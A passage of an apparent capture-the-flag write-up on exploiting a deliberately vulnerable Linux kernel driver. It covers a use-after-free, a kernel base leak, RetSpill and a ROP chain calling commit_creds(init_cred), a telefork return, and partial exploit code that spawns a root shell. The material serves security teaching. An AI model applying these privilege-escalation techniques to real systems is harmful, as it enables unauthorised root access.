</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Leaked start pointer: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">start_ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Kernel base: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/leaks.png"
        data-srcset="/posts/uiuctf_2025/images/leaks.png, /posts/uiuctf_2025/images/leaks.png 1.5x, /posts/uiuctf_2025/images/leaks.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/leaks.png"
        title="img" width="613" height="169" /></p>
<h4 id="rip-control">RIP control</h4>
<p>Now that we have both an information leak and a UAF primitive, we can overwrite the start function pointer in the seq_operations structure and gain control over RIP when <code>read()</code> is called.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">USE_WRITE</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span></span></span></code></pre></div></div>
<p>To catch this in GDB, I added this to the end of the gdbscript:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>b *seq_read_iter+226
c</code></pre></div>
<p>This breakpoint hits just before the call to the start function:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/breakpoint.png"
        data-srcset="/posts/uiuctf_2025/images/breakpoint.png, /posts/uiuctf_2025/images/breakpoint.png 1.5x, /posts/uiuctf_2025/images/breakpoint.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/breakpoint.png"
        title="img" width="1734" height="856" /></p>
<p>Using <code>si</code> to step in:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/overflow.png"
        data-srcset="/posts/uiuctf_2025/images/overflow.png, /posts/uiuctf_2025/images/overflow.png 1.5x, /posts/uiuctf_2025/images/overflow.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/overflow.png"
        title="img" width="1370" height="718" /></p>
<p>As expected, the CPU attempts to jump to the fake function pointer (<code>'A'*8</code>), confirming full RIP control.</p>
<p>Now that we have:</p>
<ul>
<li>A kernel base leak</li>
<li>RIP control</li>
</ul>
<p>We’re ready to build a full ROP chain and gain code execution in kernel space.</p>
<h4 id="rop-chain">ROP chain</h4>
<p>For the ROP chain, we can use <code>commit_creds(init_cred)</code> to elevate our process to root. After that, we need to return to userland. When protections are disabled, we can place shellcode in userland and use an <code>xchg</code> gadget on <code>rsp</code> to pivot to a userland address. However, in this case, that&rsquo;s not possible. There&rsquo;s also another problem—we don&rsquo;t have much space for our shellcode. We can overwrite the four function pointers, but they&rsquo;re not placed nicely on the stack. So, what can we do?</p>
<p>There is a technique called <a href="https://github.com/sefcom/RetSpill" target="_blank" rel="noopener noreffer ">RetSpill</a>. With this technique we can put data on the kernel stack. This is useful for kernel ROP chains where direct control over the stack is limited. As explained in the <a href="https://dl.acm.org/doi/pdf/10.1145/3576915.3623220" target="_blank" rel="noopener noreffer ">paper</a>:</p>
<blockquote>
<p>Preserved Registers. Each user space thread has its own kernel
stack. When the user space thread invokes a system call, the kernel
will switch to using the associated kernel stack by setting the rsp
register. Immediately following the stack pointer change, the kernel
pushes the user space context onto the kernel stack to preserve
the context as shown in Figure 1. Here, the “user space context” is
a data structure called pt_regs [65] that includes all of the user
space registers. These values can be carefully set by malicious users
before invoking the system call.
In other words, a fully user-controllable region is at the bottom
of the kernel stack. When the attacker triggers a CFHP, they can
use the controlled pt_regs region as a ROP payload.</p></blockquote>
<p>We can use the following code to observe which data from which register is spilled onto the kernel stack. After the assembly stub, we trigger a syscall by performing a <code>read()</code> on the seq file.</p>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define ALLOC 0x4008b900
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FREE 0xb901
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_READ 0x8001b902
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_WRITE 0x4001b902
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">driver_fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open_dev</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Opening device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Opened device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kfree</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">FREE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kread</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">USE_READ</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Allocating kernel buffer</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">val</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">ALLOC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;val = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory : 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">set_pt_regs</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rcx, 0x4141414141414141;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdi, 0x4141414141414142;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdx, 0x4141414141414143;&#34;</span>        
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rsi, 0x4141414141414144;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rbp, 0x4141414141414145;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, 0x4141414141414146;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r14, 0x4141414141414147;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r13, 0x4141414141414148;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r12, 0x4141414141414149;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r10, 0x414141414141414a;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r9,  0x414141414141414b;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r8,  0x414141414141414c;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">driver_fd</span> <span class="o">=</span> <span class="nf">open_dev</span><span class="p">(</span><span class="s">&#34;/dev/vuln&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kalloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kread</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">start_ptr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">kbase</span> <span class="o">=</span> <span class="n">start_ptr</span> <span class="o">-</span> <span class="mh">0x2ba4b0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Leaked start pointer: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">start_ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Kernel base: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">USE_WRITE</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_pt_regs</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>If we inspect the kernel stack at the time of the crash, we can see our controlled data at the bottom:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/retspill.png"
        data-srcset="/posts/uiuctf_2025/images/retspill.png, /posts/uiuctf_2025/images/retspill.png 1.5x, /posts/uiuctf_2025/images/retspill.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/retspill.png"
        title="img" width="1323" height="553" /></p>
<p>We observe that the values from registers <code>r15</code>, <code>r14</code>, <code>r13</code>, and <code>r12</code> are adjacent, followed—after 24 bytes—by data from <code>r10</code>, <code>r9</code>, and <code>r8</code>. This gives us seven registers where we can place controlled gadget addresses.</p>
<p>Importantly, this data appears at the <strong>bottom of the kernel stack</strong>, so we need a gadget in the start function that adjusts the stack to point to our first gadget (e.g., in r15):</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/offsetr15.png"
        data-srcset="/posts/uiuctf_2025/images/offsetr15.png, /posts/uiuctf_2025/images/offsetr15.png 1.5x, /posts/uiuctf_2025/images/offsetr15.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/offsetr15.png"
        title="img" width="756" height="120" /></p>
<p>This means we’re looking for a gadget like:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>ret 0x1e8</code></pre></div>
<p>This shifts the rsp forward to where our ROP chain begins.</p>
<p>We still don’t have a clean way to return to userland using traditional methods, due to protections and limited space. Instead, I used a technique called <a href="https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Telefork-teleport-back-to-userspace-using-fork" target="_blank" rel="noopener noreffer "><code>telefork</code></a>, which allows us to &ldquo;teleport&rdquo; back to userland using a combination of <code>fork</code> and <code>msleep</code>.</p>
<p>In this challenge, due to the layout and perhaps unintended side effects, the stack ended up executing the <code>fork</code> gadget twice instead of calling <code>msleep</code>, but the approach still worked.</p>
<p>Before the ret gadget executes, the stack looks like this:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/beforeret.png"
        data-srcset="/posts/uiuctf_2025/images/beforeret.png, /posts/uiuctf_2025/images/beforeret.png 1.5x, /posts/uiuctf_2025/images/beforeret.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/beforeret.png"
        title="img" width="1793" height="966" /></p>
<p>After the gadget, control is transferred to our crafted ROP chain using the spilled register values as the entry point:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/afterret.png"
        data-srcset="/posts/uiuctf_2025/images/afterret.png, /posts/uiuctf_2025/images/afterret.png 1.5x, /posts/uiuctf_2025/images/afterret.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/afterret.png"
        title="img" width="1738" height="893" /></p>
<p>The issue now is that after the <code>start()</code> function returns in <code>seq_read_iter</code>, execution simply continues within the function. Fortunately, there&rsquo;s another opportunity to regain control—right after the <code>start()</code> call, the kernel also invokes the <a href="https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L572" target="_blank" rel="noopener noreffer "><code>stop()</code></a> function:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">m</span><span class="o">-&gt;</span><span class="n">op</span><span class="o">-&gt;</span><span class="nf">stop</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span></span></span></code></pre></div></div>
<p>Since we control the entire <code>seq_operations</code> structure, we also control the stop function pointer. This gives us a second controlled jump, right after <code>start()</code> is called.</p>
<p>To make this work, I placed a <code>pop rdi; ret</code> gadget in the stop pointer. This is important because before calling <code>stop()</code>, the kernel pushes the return address onto the stack. When <code>stop()</code> is called, our <code>pop rdi</code> gadget removes that return address, allowing the next ret to go directly to our first gadget—placed at the value of <code>r15</code> in the spilled stack.</p>
<p>Here’s what that looks like in GDB, right before hitting our first gadget:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/firstgadget.png"
        data-srcset="/posts/uiuctf_2025/images/firstgadget.png, /posts/uiuctf_2025/images/firstgadget.png 1.5x, /posts/uiuctf_2025/images/firstgadget.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/firstgadget.png"
        title="img" width="1656" height="945" /></p>
<p>With full control over RIP and the stack now properly aligned to our spilled values, the ROP chain looks like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>pop rdi; ret
init_cred
commit_creds
fork
msleep</code></pre></div>
<p>At this stage, I encountered another issue: after placing <code>init_cred</code> into <code>rdi</code> and calling <code>commit_creds</code>, the function returns to the last gadget before the gap—causing a crash.</p>
<p>This is because there&rsquo;s a 24-byte gap between the values spilled into <code>r12</code> and <code>r10</code>, meaning the return path lands somewhere else.</p>
<p>To resolve this, instead of calling <code>commit_creds</code> directly after setting <code>rdi</code>, I inserted an extra <code>ret 0x18</code> gadget. This advances the stack by 0x18 bytes, skipping over the gap and correctly aligning the next return address.</p>
<p>Here’s how the stack looks right before the <code>ret 0x18</code> gadget is executed:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/beforeret18.png"
        data-srcset="/posts/uiuctf_2025/images/beforeret18.png, /posts/uiuctf_2025/images/beforeret18.png 1.5x, /posts/uiuctf_2025/images/beforeret18.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/beforeret18.png"
        title="img" width="1506" height="1023" /></p>
<p>The extra 8 bytes come from the ret instruction itself. After the stack is adjusted, we then jump to <code>commit_creds(init_cred)</code>, followed by <code>fork</code>.</p>
<p>For some reason, the fork gadget appears twice in the final chain instead of once followed by msleep, but it still worked as expected.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/finalchain.png"
        data-srcset="/posts/uiuctf_2025/images/finalchain.png, /posts/uiuctf_2025/images/finalchain.png 1.5x, /posts/uiuctf_2025/images/finalchain.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/finalchain.png"
        title="img" width="1446" height="766" /></p>
<p>The final exploit:</p>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define ALLOC 0x4008b900
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FREE 0xb901
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_READ 0x8001b902
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_WRITE 0x4001b902
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define KADDR(x) kbase+(x-0xffffffffa2e00000)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define INIT_CRED      KADDR(0xffffffffa4852fc0) 
</span></span></span><span class="line"><span class="cl"><span class="cp">#define COMMIT_CREDS   KADDR(0xffffffffa2eb9970)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define POP_RDI        KADDR(0xffffffffa2e4b80d)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define RET_1E0h       KADDR(0xffffffffa350ed2b)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define RET_18h        KADDR(0xffffffffa2f2ef8a)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define RET            KADDR(0xffffffffa2e00426)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MSLEEP         KADDR(0xffffffffa2f34bc0)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SYS_FORK       KADDR(0xffffffffa2e84ce0)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">int</span> <span class="n">signum</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;uid: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">getuid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">driver_fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open_dev</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Opening device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
